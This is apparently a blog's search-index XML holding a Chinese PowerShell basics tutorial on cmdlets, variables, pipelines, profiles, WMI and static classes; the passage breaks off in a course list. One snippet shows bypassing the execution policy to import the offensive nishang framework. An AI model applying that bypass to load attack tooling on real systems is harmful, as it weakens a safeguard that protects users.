<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>PowerShell 基础总结</title>
      <link href="/2018/07/05/PowerShell%20%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/"/>
      <url>/2018/07/05/PowerShell%20%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<h2 id="0x01-PowerShell简介及特性"><a href="#0x01-PowerShell简介及特性" class="headerlink" title="0x01 PowerShell简介及特性"></a>0x01 PowerShell简介及特性</h2><p>Windows PowerShell 是一种命令行外壳程序和脚本环境(相当于 UNIX 系统 BASH),使命令行用户和脚本编写者可以利用.NET Framework的强大功能(因此也支持.NET对象)。<br>Windows PowerShell具备以下特性:</p><pre><code>操作便捷—-可识别单位(如GB、MB、KB等)Cmdlet命令结构简单(动名词形式)面向对象—-同面向过程相比,更容易描述现实事物结合.NET Framework环境—-借助.NET Framework平台的强大的库兼容性强—-完全兼容windows平台上其他调用,如exe文件执行、bat脚本执行等基于平台的可扩展性—-PowerShell俨然已形成一个平台,并且向各类平台管理提供对应管理组件</code></pre><p>PowerShell Version<br><img src="/2018/07/05/PowerShell 基础总结/ps-version.png" alt="ps-version"></p><a id="more"></a><p>各版本独立包下载地址如下：</p><pre><code>Windows PowerShell 1.0：    https://support.microsoft.com/en-us/help/926139/windows-powershell-1.0-english-language-installation-packages-for-windows-server-2003-and-for-windows-xp。    https://support.microsoft.com/en-us/help/928439/windows-powershell-1.0-installation-package-for-windows-vista。Windows PowerShell 2.0：    https://support.microsoft.com/en-us/help/968929/windows-management-framework-windows-powershell-2.0,-winrm-2.0,-and-bits-4.0。Windows PowerShell 3.0：    https://www.microsoft.com/en-us/download/details.aspx?id=34595。Windows PowerShell 4.0：    https://www.microsoft.com/en-us/download/details.aspx?id=40855。Windows PowerShell 5.0：    https://www.microsoft.com/en-us/download/details.aspx?id=50395。Windows PowerShell 5.1：    https://www.microsoft.com/en-us/download/details.aspx?id=54616。</code></pre><h2 id="0x02-PowerShell基础语法"><a href="#0x02-PowerShell基础语法" class="headerlink" title="0x02 PowerShell基础语法"></a>0x02 PowerShell基础语法</h2><p>PowerShell基础语法<br><img src="/2018/07/05/PowerShell 基础总结/ps.png" alt="ps"></p><h3 id="1-交互式"><a href="#1-交互式" class="headerlink" title="1) 交互式"></a>1) 交互式</h3><p>a)    命令:cmdlet命令—动词+名词(通过get-command –commandtype cmdlet</p><p>c)    惯用帮助文档:通过Get-Help(别名:Help)-Name 命令名    help IEX</p><p>b)    别名机制:Get-Alias –name 命令名</p><h3 id="2-变量"><a href="#2-变量" class="headerlink" title="2) 变量"></a>2) 变量</h3><p>a)    定义变量:PowerShell不需要声明变量,可自动创建变量,变量值可以是字符也可以是命令,但是变量名前必须有$</p><pre><code>$a=1$b=2&quot;$a,$b&quot; -&gt; 1,2$c=$a+$b$d=&#39;的文&#39;&quot;$c,$d&quot; -&gt; 3,的文</code></pre><p>注意:输出多个变量时需要使用双引号,单引号是不会取变量中的值的。</p><p>以下给num变量添加只读属性。</p><pre><code>&gt; New-Variable xx -value &quot;33&quot; -Option ReadOnly&gt; $xx=5Cannot overwrite variable xx because it is read-only or constant.</code></pre><h3 id="3-数组"><a href="#3-数组" class="headerlink" title="3) 数组"></a>3) 数组</h3><p>a)    创建数组:常规数组可以使用逗号,连续数字数组可以使用。</p><pre><code>&gt; $xxc = 1,&quot;434&quot;,(get-date)&gt; $xxc    1    434    Wednesday, July 4, 2018 3:07:06 AM其中有以下两个特例:空数组:&gt; $strr = @()&gt; $strr -is [array]    True一个元素数组:&gt; $strr = ,&quot;dd&quot;&gt; $strr -is [array]&gt; $strr.Count    1</code></pre><p>b)    数组的操作<br>    数组访问同python类似,从0开始<br>    数组的判断:$str –is [array]<br>    数组的追加:$books +=”需要添加的值”</p><pre><code>$strr +=&quot;ffff&quot;$strr.Count    2</code></pre><p>c)    哈希表的使用<br>    之前创建空数组是使用@()<br>    而创建哈希表用到的是@{}<br>    此处的哈希表同python中的字典类型类似:</p><pre><code>&gt; $hashlist = @{&#39;ddd&#39;=3434;&#39;5&#39;=66;&quot;ewew&quot;=&#39;dsd&#39;}&gt; $hashlist    Name                           Value                                               ----                           -----                                               5                              66                                                  ddd                            3434                                                ewew                           dsd   </code></pre><p>创建Hash表，语法以@{开头以}结尾，在分隔符内以定义键值对集，其中键值以=分割，不同的键值对以;分割。<br>例：</p><pre><code>$test = @{ b1 = &quot;prml&quot;; b2 = &quot;ia&quot;}</code></pre><p>可以通过$test.b1、$test[‘b1’]访问值，通过$test.keys得到所有键。 </p><p>PowerShell中创建数组的方式以逗号分割，例$test = 1, 2, 3，</p><p>对于数字数组还可以使用范围运算符$test = 2 .. 3。PowerShell中数组默认是多态的，</p><p>即可以在数组中存储任意类型的对象。创建单元素数组$test = ,1，创建空数组$test = @()。</p><h3 id="4-简写对比"><a href="#4-简写对比" class="headerlink" title="4) 简写对比"></a>4) 简写对比</h3><p>PowerShell语句解析<br>双引号、单引号与反引号之间的区别。</p><p>转义序列，如下：</p><pre><code>`n      换行         `r      回车     `t      水平制表符`a      警铃`b      退格`&#39;      单引号`&quot;      双引号   `0      空``      单反引号</code></pre><p>PowerShell类型</p><pre><code>PowerShell类型别名    .NET类型int[]            System.Int32[int[]]            System.Int32[][long]            System.Int64[long[]            System.Int64[][string]        System.String[string[]]        System.String[][char]            System.Char[char[]]        System.Char[][bool]            System.Boolean[bool[]]        System.Boolean[][byte]            System.Byte[byte[]]        System.Byte[][double]        System.Double[double[]]        System.Double[][decimal]        System.Decimal[decimal[]]        System.Decimal[][float[]]        System.Single[single]        System.Single[regex]            System.Text.RegularExpressions.Regex[array]            System.Array[xml]            System.Xml.XmlDocument[sriptblock]        System.Management.Automation.ScriptBlock[switch]        System.Management.Automation.SwitchParameter[hashtable]        System.Collections.Hashtable[psobject]        System.Management.Automation.PSObject[type]            System.Type[type[]]        System.Type[]</code></pre><p>访问静态方法，[类名]::属性名，如</p><pre><code>[math]::cos([math]::pi / 3)</code></pre><p>类型转换，例：</p><pre><code>[string] [char[]] ( [int[]] [char[]] $s | foreach {$_+1} )</code></pre><p>2&gt;    dir nosuchfile.txt 2&gt; err.txt    重定向错误流到文件…<br>2&gt;&gt;    dir nosuchfile.txt 2&gt;&gt; err.txt    重定向错误流到文件…<br>2&gt;&amp;1    dir nosuchfile.txt 2&gt;&amp;1    将错误流写到输出管线</p><p>非常重要的文件系统命令概览</p><pre><code>别名                描述                                    命令cp, cpi            复制文件或者目录                            Copy-ItemDir, ls, gci    列出目录的内容                            Get-Childitemtype, cat, gc    基于文本行来读取内容                        Get-Contentgi                获取指定的文件或者目录                    Get-Itemgp                获取文件或目录的属性                        Get-ItemPropertyii                使用对应的默认windows程序运行文件或者目录    Invoke-Item—                连接两个路径为一个路径                    Join-Pathmi, mv, move    移动文件或者目录                            Move-Itemni                创建新文件或者目录                        New-Itemri, rm, rmdir,del, erase, rd    删除空目录或者文件        Remove-Itemrni, ren        重命名文件或者路径                        Rename-Itemrvpa            处理相对路径或者包含通配符的路径            Resolve-Pathsp                设置文件或路径的属性                        Set-ItemPropertyCd,chdir, sl    更改当前目录的位置                        Set-Location—                提取路径的特定部分,例如父目录,文件名        Split-Path—                测试指定的路径是否存在                    Test-Path</code></pre><p>用于指定相对路径的四个重要的特殊字符</p><pre><code>字符    意义        示例    示例描述.    当前目录    ii .    用资源浏览器打开当前目录..    父目录        Cd ..    切换到父目录\    驱动器根目录    Cd \    切换到驱动器的顶级根目录~    家目录        Cd ~    切换到PowerShell初始化的目录</code></pre><p>存储在环境变量中的Windows特殊目录</p><pre><code>特殊目录                            描述                            示例C:\Users\YvY\AppData\Local        存储在本地机器上的应用程序数据    $env:localappdataC:\Users\YvY                    用户目录                            $env:userprofileC:\Program Files\Common Files    应用程序公有数据目录                $env:commonprogramfilesC:\Users\Public                    所有本地用户的公有目录            $env:publicC:\Program Files                具体应用程序安装的目录            $env:programfilesC:\Users\YvY\AppData\Roaming    漫游用户的应用程序数据            $env:appdataC:\Users\YvY\AppData\Local\Temp    当前用户的临时目录                $env:tmpC:\Users\YvY\AppData\Local\Temp    公有临时文件目录                    $env:tempC:\Windows                        Windows系统安装的目录            $env:windir</code></pre><p>构造路径的方法</p><pre><code>方法                    描述                                示例ChangeExtension()        更改文件的扩展名                        ChangeExtension(“test.txt”, “ps1”)Combine()                拼接路径字符串; 对应Join-Path        Combine(“C:\test”, “test.txt”)GetDirectoryName()        返回目录对象:对应Split-Path -parent    GetDirectoryName(“c:\test\file.txt”)GetExtension()            返回文件扩展名                        GetExtension(“c:\test\file.txt”)GetFileName()            返回文件名:对应Split-Path -leaf        GetFileName(“c:\test\file.txt”)GetFileNameWithoutExtension()    返回不带扩展名的文件名        GetFileNameWithoutExtension(“c:\test\file.txt”)GetFullPath()            返回绝对路径                            GetFullPath(“.\test.txt”)GetInvalidFileNameChars()    返回所有不允许出现在文件名中字符    GetInvalidFileNameChars()GetInvalidPathChars()    返回所有不允许出现在路径中的字符        GetInvalidPathChars()GetPathRoot()            返回根目录:对应Split-Path -qualifier    GetPathRoot(“c:\test\file.txt”)GetRandomFileName()        返回一个随机的文件名                    GetRandomFileName()GetTempFileName()        在临时目录中返回一个临时文件名        GetTempFileName()GetTempPath()            返回临时文件目录                        GetTempPath()HasExtension()            如果路径中包含了扩展名,则返回True        HasExtension(“c:\test\file.txt”)IsPathRooted()            如果是绝对路径,返回为True; Split-Path -isAbsolute    IsPathRooted(“c:\test\file.txt”)</code></pre><p>运行命令中包含空格的命令,需要用单引号将命令括起来,同时在命令前面加: &amp; 符号;<br>这在PowerShell中称为调用操作<br>Exp:</p><pre><code>&amp;&#39;C:\Program Files\Program\Program.exe&#39; arguments</code></pre><h3 id="4-PowerShell的安全执行策略"><a href="#4-PowerShell的安全执行策略" class="headerlink" title="4) PowerShell的安全执行策略"></a>4) PowerShell的安全执行策略</h3><pre><code>默认情况下,PowerShell不允许执行脚本文件,上面的用户配置文件也包括在内;如果不修改PowerShell的安全执行策略,你在PowerShell执行Get-ExecutionPolicy命令来查看默认的策略组Set-ExecutionPolicy RemoteSignedPS C:\&gt;&gt; Import-Module .\nishang-master\nishang.psm1nishang.psm1 cannot be loaded. The filem is not digitally signed. You cannot run this script on thecurrent system......Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypassok</code></pre><h3 id="5-PowerShell-中内置的命令"><a href="#5-PowerShell-中内置的命令" class="headerlink" title="5) PowerShell 中内置的命令"></a>5) PowerShell 中内置的命令</h3><p>实现cmd中tasklist的功能。</p><p>PowerShell中内置的命令称为cmdlets,cmdlet实现具有以下特点:</p><p>　　1)统一的命令形式<br>　　2)支持管道功能<br>　　3)输出易于管理的对象,支持面向对象的概念</p><p>在PowerShell中有一个内置的变量: $profile;这个变量指示了PowerShell用户自定义配置文件。<br>可以在PowerShell中输入 $profile。</p><p>cd命令现在用set-location命令替代了;dir命令用get-childitem命令替代了。<br>通过:   set-alias 命令来设置命令别名。</p><pre><code>set-alias   new     new-objectorset-alias   iexplorer  &#39;c:\program files\internet explorer\iexplorer.exe&#39;</code></pre><p>获取指定命令的帮助信息</p><p>　　eg:  get-command  get-process</p><p>利用通配符进行搜索<br>PowerShell支持通配符搜索,这一功能的完美支持,完全可以媲美linux下的正则表达式。</p><pre><code>get-command *char*</code></pre><p>例如搜索带动词get的命令:  </p><pre><code>get-command   -verb   get</code></pre><p>搜索带名词service的命令:  </p><pre><code>get-command   -noun  service</code></pre><p>cmdlets一致的命令接口模式</p><p>　　PowerShell采用一种称为cmdlets的命令接口模式,所有的命令都遵循这样的命令模式:<br>动词-名词,如:get-command 命令, get就是动词,而command就是名词</p><pre><code>get-process  / get-eventlog    </code></pre><p>在PowerShell中则有四种方法获取帮助:</p><pre><code>a)利用 get-command 命令b)利用 get-help  命令c)利用  -?命令选项d)查看系统帮助信息</code></pre><p>利用get-command命令和利用get-help命令获取命令帮助信息是不同的</p><pre><code>get-command直接从cmdlet、函数、变量脚本或者别名中获取信息,get-help命令则从系统帮助主题文件中获取信息,通常get-help命令获取的帮助信息比get-command命令详细。</code></pre><p>Exp: 利用get-command  获取get-help帮助信息</p><pre><code>Get-Command Get-Help | Format-List</code></pre><p>Exp: 利用get-help 获取自身的帮助信息</p><pre><code>get-help   get-help</code></pre><p>利用get-help命令获取帮助信息可以指定命令选项来获取不同详细程度的帮组信息:</p><pre><code>a) -detailed 选项 ; 获取特定命令的帮助信息详情;例如:  get-help  -detailed   get-processb) -full 选项; 获取特定命令的全部帮助信息; 例如:  get-help  -full   set-locationc) -examples 选项;获取特定命令的实例帮助信息; 例如: get-help  -examples   get-childitem</code></pre><p>为了兼容Unix/Linux Shell(主要是bash)的命令;PowerShell中提供了一套机制来兼容cmd.exe和bash命令。</p><pre><code>dir cat ps ....</code></pre><p>标准命令的别名,PowerShell还提供一套机制来支持内置cmdlet的命令别名。<br>我们知道cmdlets采用一致的用户接口模式: 动词-名词。<br>例如:</p><pre><code>动词　　命令的缩写/别名get 　　gset　　　sitem　　ilocation　　lcommand    cm</code></pre><p>查找别名 </p><pre><code>Get-Alias –name f*</code></pre><p>PS中还存在很多内置的别名,这个可以通过get-alias cmdlet来查看</p><p>介绍一个重要的概念:别名驱动器,在PS中有一个内置的环境支持对象,那就是别名驱动器;其盘符为alias:; 注意这个盘符是个虚拟的逻辑对象盘符,<br>而不是实际的分区盘符。在PS中通过cd  alias:可以进入这个虚拟盘符。</p><p>以通过get-childitem(ls / dir )命令获取这个虚拟驱动器下的内容.</p><p>创建别名<br>Exp:</p><pre><code>set-alias    np　　c:\windows\notepad.exe     (在不同的系统上这个路径可能不同)</code></pre><p>Exp:</p><pre><code>remove-item    alias:\np</code></pre><p>使用函数替代带有参数的命令<br>使用set-alias命令不可以为带有参数的命令创建别名。<br>Exp:</p><p>　　function    np-Profile   {notepad   $profile}<br>　　这样定义的函数与别名具有类似的功能,在PS中键入np-profile 就会打开profile来编辑。</p><p>在PS中利用env环境变量对象来获取path路径。</p><pre><code>$env:path</code></pre><p>如果要将某个路径添加到默认搜索路径下,只需像下面这样就可以:<br>Exp:</p><p>　　$env:path += “;H:\”</p><p>需要注意的是,这样添加的路径仅在当前会话中有效,当前会话推出后就不再有效。如果需要一直有效,就必须修改配置文件。</p><p>管理错误</p><pre><code>在使用PS的过程中,经常会碰到错误;在PS中又两类错误: 终止错误、 非终止错误。终止错误:终止错误出现时,将终止命令的执行;例如,无法删除文件,这时PS会继续运行而不管该错误,然后显示错误和输出。非终止错误:不终止命令的执行;例如,提交无效的操作对象,PS就会生成终止错误</code></pre><p>PS提供的最具有突破性的功能就是:虚拟驱动器导航功能。在PS中,除了可以在文件系统驱动器之外进行浏览;还可以在HKEY_LOCAL_MACHINE(HKLM:)和<br>HKEY_CURRENT_USER(HKCU:)注册表配置单元驱动器中进行浏览,还可以在数字签名证书存储区(Cert:)以及当前会话中的函数等的驱动器中进行浏览,这些驱动<br>器统称为windows PS 驱动器。<br>可以通过:get-psdrive 来查看PS支持的驱动单元</p><p>文件系统中导航/浏览</p><p>Exp:</p><pre><code>get-item  *  可以用来获取当前目录下的内容; 而单独的get-item运行时会提示输入路径或者操作对象。</code></pre><p>在PS中内置的变量 </p><pre><code>$home 表示当前登录者的家目录$pshome 则表示widnows PowerShell的安装目录与其他shell一样,可以再PS中进行目录和文件操作;这通过下面的相关cmdlet实现: get-item、get-childitem、new-item、remove-item、set-item、move-item和copy-item实现。</code></pre><p>浏览注册表</p><pre><code>PS中最值得推荐的特性之一就是可以再注册表中进行浏览和方便的操作。并且浏览方法和文件浏览方法保持一致。在PS中HKEY_LOCAL_MACHINE配置单元</code></pre><p>映射到hklm:驱动器; 而HKEY_CURRENT_USER配置单元则映射到HKCU:驱动器</p><pre><code>cd hkcu:dir hkcu\software</code></pre><p>配置文件</p><p>　　PS环境默认有4个配置文件</p><p>1  针对所有用户,影响所有shell的配置文件</p><pre><code>这个配置文件存放在:   %windir%\system32\windowsPowerShell\v1.0\profile.psl修改这个配置文件将影响所有的用户,以及所有的shell。</code></pre><p>2  针对所有用户,只影响Windows PowerShell的配置文件</p><pre><code>这个配置文件保存在:  %windir%\system32\windowsPowerShell\v1.0\microsoft.PowerShell_pfrofile.psl修改这个配置文件将影响所有的用户,但只针对windows PowerShell有效。</code></pre><p>3  针对当前用户,影响所有shell的用户配置文件</p><pre><code>这个配置文件保存在: %userprofile%\my documents\windowsPowerShell\v1.0\profile.psl修改这个配置文件只对当前用户有效,但是会影响所有的shell</code></pre><p>4  针对当前用户,只影响PS的用户配置文件</p><pre><code>这个配置文件保存在: %userprofile%\my documents\windowsPowerShell\v1.0\microsoft.poweshel_profile.psl修改这个配置文件只对当前用户有效,并且只影响PS。</code></pre><p>$path 变量存储的路径<br>这么多配置文件,那么在当前会话中到底哪个起作用呢？<br>这个问题的答案就是: 只有与$path 变量中存储路径相同的配置文件才起作用; 包括路径和文件名。</p><h3 id="6-管道和对象成员"><a href="#6-管道和对象成员" class="headerlink" title="6) 管道和对象成员"></a>6) 管道和对象成员</h3><p>1  管道<br>    管道的最大特点就是:  前一个命令的输出作为后一个命令的输入。cmd、bash均支持管道</p><p>管道的概念。<br>在PS中,继承了cmd管道符号的表示方法:  |   表管道;</p><p>但是PS与cmd的管道有本质的区别, cmd中的管道传递的是文本信息,</p><p>而PS中传递的是对象,因此PS中的管道更加易于使用和管理。</p><pre><code>例如:   get-location cmdlet</code></pre><p>命令返回的是一个pathinfo对象,这个对象是一个信息包,信息包中包含了相关的信息。</p><p>对象成员<br>利用get-member获取对象的成员信息</p><pre><code>get-location | get-memberget-help  -parameter *  get-member</code></pre><p>可以发现get-member cmdlet支持:force、inputobject、membertype、name、static、view这些参数。 下面我们简要的利用一下这些参数</p><p>Exp: 获取对象的静态方法和属性 </p><pre><code>get-location | get-member  -static</code></pre><p>Exp: 获取对象的属性    </p><pre><code>get-location | get-member  -membertype  property</code></pre><p>格式化输出</p><p>PS支持4个格式化cmdlet:  format-wide、 format-list、format-table、format-custom; 这里仅介绍前面三个。</p><p>四个命令均需要管道输出对象作为输入;四个cmdlet均有默认的输出属性,如果不进行指定,则输出默认的属性。</p><p>1.format-wide　　<br>格式化命令默认输出不同数量的属性,format-wide默认仅输出一个默认属性。</p><pre><code>get-command  | format-wideExp: 利用format-wide 的property参数输出comandtype信息。get-command  | format-wide -property  commandtype</code></pre><p>2.format-list<br>format-list以列表的形式输出信息</p><pre><code>get-location | format-list -property  pathget-location | format-list -property *</code></pre><p>3.format-table<br>format-table以表格的形式输出信息</p><pre><code>get-process | format-table利用property参数控制输出的属性Exp:    get-process | format-table  -property  path,cpu,id,pm    get-process | format-table  -property  path,cpu,id,pm   -autosize    get-process | format-table  -property  cpu,id,pm,path   -wrap    wrap参数用来将输出信息换行输出。groupby参数format-table 通过groupby参数还支持分组输出</code></pre><p>在PS中通过 &gt; 来实现输出重定向</p><p>利用 &gt;&gt; 追加信息    get-process &gt;&gt; process.txt</p><p>PS新增的特性 out-* cmdlet集重定向<br>    PS中的out重定向命令集,具有两个特点:</p><pre><code>    1 这些out-* cmdlets 的输出不是对象,而是文本格式的数据,这是因为out-* cmdlet要将数据传输到接受文本信息的系统组件    2 这些out-* cmdlet 将数据从PS中发送到其他位置,同时在这些命令执行完毕的时候,会将在管道中传输的对象删除</code></pre><p>利用Format-wide 命令来验证out-* cmdlet的第二个特性</p><pre><code>get-childitem | out-host  |format-wide -column 2</code></pre><p>原本我们通过get-childitem命令获取当前目录下的子目录传递给out-host,</p><p>然后想利用format-wide -column 命令输出2列name属性信息,结果输出了很多列。</p><p>out-host命令将在管道中传输的对象删除了。其实质就是当out-* cmdlet执行时,将删除传递给他的对象。</p><p>变换一下管道传递的先后顺序则会得到:</p><pre><code>get-childitem |format-wide -column 2  | out-host  </code></pre><p>注意: 所有的out命令均具有第二个特性,需要注意。</p><p>Ps中分页输出</p><pre><code>执行某些命令的时候,其输出信息量大,无法在当前页面中完整的显示所有信息,这就需要分页显示;在cmd中又more命令,在bash中也有类似的命令。在PS中通过参数来实现这一功能:  -paging</code></pre><p>放弃输出</p><p>在cmd利用重定向可以阻止输出信息, 例如: dir&gt;nul<br>而在PS中需要进行管道传递,并且使用专门的cmdlet: out-null。</p><p>打印输出</p><p>利用 out-printer 命令打印输出信息。</p><p>重定向输出到文件</p><pre><code>get-process | out-file process.txt </code></pre><p>有一点需要注意: out-file命令创建的是Unicode编码的文件,有时候为了输出ASCII编码的文件,</p><p>我们需要增加-encoding参数, 从而控制输出的文本编码格式</p><p>Exp:利用encoding参数控制编码格式</p><pre><code>get-process | out-file  -encoding ascii -filepath .\process.txt</code></pre><p>目录和文件的建立、复制、移动和删除</p><p>item作为cmdlet名词部分的cmdlet都与文件或目录的操作有关。</p><p>利用get-command的发现功能查询文件操作相关命令</p><pre><code>get-command *-item</code></pre><p>利用get-item获取当前用户home目录的信息</p><pre><code>get-item $homeget-childitem get-childitem -nameget-childitem -path $homeget-childitem -force    Exp: 获取所有的子项,利用force参数 get-childitem -path $home -recurse    Exp:递归获取路径下的子项new-item    new-item -path $home\vol.txt  -itemtype file( or directory) rename-item  vol.txt  volcanol.txtmove-item   ..\volcanol.txt  .\copy-item vol .\desktopcopy-item vol  .\desktop  -recurse    exp:复制容器下的项目remove-item  .\Desktop\vol -recurse</code></pre><h3 id="7-WMI对象和COM组件"><a href="#7-WMI对象和COM组件" class="headerlink" title="7) WMI对象和COM组件"></a>7) WMI对象和COM组件</h3><p>利用Get-WmiObject命令获取WMI信息</p><pre><code>get-wmiobject  -list</code></pre><p>输出的头部:NameSpace: ROOT\CIMV2 ; 这个输出表示当前获取的WMI类型从属于root\cimv2 命名空间</p><pre><code>get-wmiobject   -list  -namespace   root\cimv2</code></pre><p>get-wmiobject有很多的参数,其中一个就是:computername参数,指定计算机名或者IP地址,可以从远程计算机上获取相关的信息:</p><pre><code>get-wmiobject  -list  -computername localhost</code></pre><p>显示WMI类的详细信息</p><p>用-class参数显示 win32_operatingsystem类的信息</p><pre><code>get-wmiobject  -class  win32_operatingsystem -namespace root\cimv2  </code></pre><p>cmdlet均有自己默认的属性,当没有指定参数或者属性时,cmdlet将以默认的属性或者参数进行操作,</p><p>get-wmiobject也有几个默认的参数: -class;</p><p>默认的namespace是root\cimv2; 而computername默认的是本机(localhost)。</p><pre><code>因此上面的命令:  get-wmiobject -class win32_operatingsystem -namespace root\cimv2    相当于:  get-wmiobject  win32_operatingsystem </code></pre><p>利用Format命令显示非默认属性</p><pre><code>前面说过可以利用Format命令显示对象的非默认显示属性或者信息,这里一样可以显示非默认的信息。例如利用Format-table命令显示win32_operatingsystem的Total*和Free的get-wmiobject  -class  win32_operatingsystem -namespace root\cimv2   | format-table -property total*,free*</code></pre><p>创建WMI对象<br>既然WMI模型中有那么多的类,那么根据面向对象的思想,我们就可以利用这些类实例化一些对象。在PS中利用New-Object命令实例化对象。</p><p>在Windows下某些软件组件具有Net Framework和Com接口,因此可以执行许多的系统的管理任务;</p><p>PS可以使用这些组件。早起版本的Ps多数的cmdlet不支持远程计算机。</p><p>但在PS中利用Net Framework的system.diagnostics.eventlog类管理事件日志时可消除这个限制。</p><p>new-object命令创建system.diagnostics.eventlog对象</p><pre><code>new-object -typename  system.diagnostics.eventlog    </code></pre><p>如上所示,我们创建了一个system.diagnostics.eventlog的对象,但是这个对象实例没有包含任何的数据,这是因为没有为其指定特定的事件日志。</p><p>构造函数<br>与面向对象一致,需要利用类的构造函数来初始化对象。在这里我们通过指定日志名称引用特定的事件日志,</p><p>并将日志名称传递给类的构造函数。使用-argumentlist参数指定特定的事件日志</p><pre><code>new-object -typename system.diagnostics.eventlog  -argumentlist application    </code></pre><p>由于在PS中大多数的Net Framework核心类在system明明空间中定义,因此如果PS找不到指定的类型名称项,</p><p>则会到system命名空间中查找类,这就是说我们可以不指定system</p><p>命名空间来引用system.diagnostics.eventlog,而是使用diagnostics.eventlog.</p><pre><code>new-object -typename diagnostics.eventlog  -argumentlist application</code></pre><h3 id="8-静态对象"><a href="#8-静态对象" class="headerlink" title="8) 静态对象"></a>8) 静态对象</h3><pre><code>在PS中有一类特殊的对象,我们不能同过这些类创建新的对象,这些类是不能更改状态的方法和属性的引用库。无法创建这些类,仅可以使用它。因为不能创建、销毁或更改这些类和方法,因此也将这些类叫做静态类。</code></pre><p>1 system.environment 静态类</p><p>在PS中经常用到的静态类有system.environmet类。例如我们可以在PS中查看这些类:</p><pre><code>system.environment</code></pre><p>查看了system.environment,类的信息,可以看出来system.environment,继承于system.object类。 </p><p>这里还有一点需要注意的,那就是引用静态类的时候,要用”[]”,表示引用的是静态类。</p><p>2 利用get-member函数是static参数获取静态类成员</p><pre><code>[system.environment] | get-member</code></pre><p>通过get-member获取的类型是:system.runtimetype;与原来的类型不一致,这是为什么呢?</p><p>因为静态类与其他的类在行为和方式上不同。在使用get-member命令获取静态类的信息的时候,需要附加-static参数。</p><p>可以通过指定membertype参数来分类获取静态类的属性和方法。</p><p>命令分别为:</p><pre><code>[system.environment] | get-member  -membertype  property     # 获取属性[system.environment] | get-member  -membertype  method       # 获取方法</code></pre><p>试一下是否可以用new-object创建静态对象。</p><pre><code>new-object   system.environment</code></pre><p>New-Object : 找不到构造函数。无法找到适合类型 system.environment 的构造函数。</p><p>可以发现,静态类没有构造函数,因此静态函数仅仅是一个库,可以使用的库,不能通过它来派生新的的类和构造类的对象。</p><p>3  引用静态类的成员<br>    在PS中通过全局引用符 “ :: “来引用静态类的成员。</p><pre><code>[system.environment]::commandline--&gt;    &quot;C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell_ISE.exe&quot;</code></pre><p>利用commandline获取了PS的安装路径。还可以通过OsVersion属性获取系统的版本信息</p><pre><code>[system.environment]::osversion</code></pre><p>4 system.math 类进行数学运算<br>    在PS中还提供了另外一个静态类, system.math. 同样可以通过get-member命令获取system的成员。</p><pre><code>[system.math] | get-member -static  -membertype method</code></pre><p>管道对象管理</p><p>执行cmdlet时,在管道中传递的对象比我们实际需要的要多,而且有时候我们并不需要关注这么多的对象,</p><p>那么我们是否可以对这些对象进行一下筛选呢？</p><p>在PS中我们可以使用where-object命令进行筛选。</p><p>1 where-object命令<br>利用where-object命令可以逐一的测试管道中传递的对象,并将符合筛选条件的对象在管道中进行传递,而将不符合条件的对象从管道中删除;</p><p>实现这一功能需要使用where-object的FilterScript表达式特性。</p><p>FiltrScript表达式为返回值为true或者false的脚本块; 脚本块是有{} 括起来的一个或者多个PS命令,这些脚本简单而功能强大。</p><p>使用这些脚本需要使用PS提供的另外一个特性:比较运算符。</p><p>在PS中,比较运算符不区分大小写,因为在PS中 小于(&lt;)、大于(&gt;) 、等于(=)因为有特殊的用途,因此用字母token表示。基本的运算符有:</p><pre><code>比较运算符          含义         实例(返回TRUE)-eq              等于             1 –eq  1-ne              不等于           1 –ne   2-lt              小于              1 –lt   2-le              小于或等于      1 –le    2-gt              大于              2 –gt  1-ge              大于等于        2 –ge   1-like            类似需要用     &quot;file.doc&quot;  -like    &quot;f*.do?&quot;                 文本通配符-notlike        不类似           &quot;file.doc&quot;  -notlike  &quot;p*.doc&quot;-contains       包含              1,2,3  -contains   1-notcontains    不包含            1,2,3  -notcontains   4</code></pre><p>在PS中为了遍历管道中的对象,提供了一个预置的变量: $_  ;通过这个对象可以遍历管道中传递的对象。</p><p>利用FilterScript进行筛选</p><pre><code>1,2,3,4,5 | where-object  -filterscript {$_  -lt  3}输出 1  2</code></pre><p>还可以根据对象的属性进行筛选。例如我们要查看WMI中win32_systemdriver类,在系统中可能有几百个这样的系统驱动程序,而我们可能</p><p>只对其中的一部分感兴趣,这样我们就可以通过FilterScript来获取我们感兴趣的驱动类。</p><p>利用FilterScript表达式获取win32_systemdriver中正在运行的类</p><pre><code>get-wmiobject -class  win32_systemdriver  | where-object  -filterscript {$_.state -eq &quot;running&quot;}</code></pre><p>PS中的逻辑运算符有:   -and、 -or、-not 、!; 分别是与、或、非(其中 ! 也是表示非)。</p><h2 id="0x03-PowerShell官方视频教程"><a href="#0x03-PowerShell官方视频教程" class="headerlink" title="0x03 PowerShell官方视频教程"></a>0x03 PowerShell官方视频教程</h2><h3 id="1-Getting-Started-with-Microsoft-PowerShell"><a href="#1-Getting-Started-with-Microsoft-PowerShell" class="headerlink" title="1. Getting Started with Microsoft PowerShell"></a>1. Getting Started with Microsoft PowerShell</h3><pre><code>(PowerShell 3.0 入门教程 )https://www.pstips.net/powershell-v3-basic--&gt; https://mva.microsoft.com/en-US/training-courses/getting-started-with-microsoft-powershell-8276?l=r54IrOWy_2304984382简介课程安排课程 1 : 克服对 Shell 的恐惧课程 2 : 帮助系统课程 3 : 使用管道建立连接和扩展 Shell课程 4 : 用于管理的对象课程 5 : 深入探讨管道课程 6 : 在 Shell 中使用 PowerSehll远程管理课程 7 : 为自动化做好准备课程 8 : 大规模自动化 ：远程操作课程 9 : 脚本和工具制作简介</code></pre><h3 id="2-Advanced-Tools-amp-Scripting-with-PowerShell-3-0-Jump-Start"><a href="#2-Advanced-Tools-amp-Scripting-with-PowerShell-3-0-Jump-Start" class="headerlink" title="2. Advanced Tools &amp; Scripting with PowerShell 3.0 Jump Start"></a>2. Advanced Tools &amp; Scripting with PowerShell 3.0 Jump Start</h3><pre><code>( 快速入门 : PowerShell 3.0 高级工具和脚本 )https://mva.microsoft.com/en-US/training-courses/advanced-tools-scripting-with-powershell-30-jump-start-8277?l=WOWaGUWy_8604984382https://mva.microsoft.com/zh-cn/training-courses/advanced-tools-scripting-with-powershell-30-jump-start-8277?l=g5FhezP5_704984382英文源有下载背景教程介绍教程主题1. 脚本入门2. PowerShell脚本语言3. 简单脚本和功能4. 